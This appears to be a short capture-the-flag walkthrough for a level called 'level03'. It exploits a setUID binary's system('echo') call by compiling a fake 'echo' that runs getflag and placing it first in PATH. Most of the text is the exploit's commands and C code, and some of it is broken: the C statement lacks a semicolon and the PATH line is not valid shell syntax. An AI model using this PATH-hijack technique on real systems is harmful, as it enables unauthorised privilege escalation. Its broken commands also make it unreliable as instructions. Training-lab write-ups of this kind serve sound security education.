#The file in our home is a binary, lets ltrace it

ltrace ./level03

#We can see that's a setUID which execute an echo system command as flag03 through a call to the system() function.

#Let make a new directory in /tmp to have more freedom

mkdir /tmp/azur
cd /tmp/azur

#to exploit the system() call we must build an exploit, lets create a C main :

void main()
{
    system("getflag")
}

#Then, we built it as "echo"

gcc main.c -o echo

#We add our custom directory to the "PATH" in order to use our custom echo instead of the system one

PATH:/tmp/azur:$PATH

#lets try it out
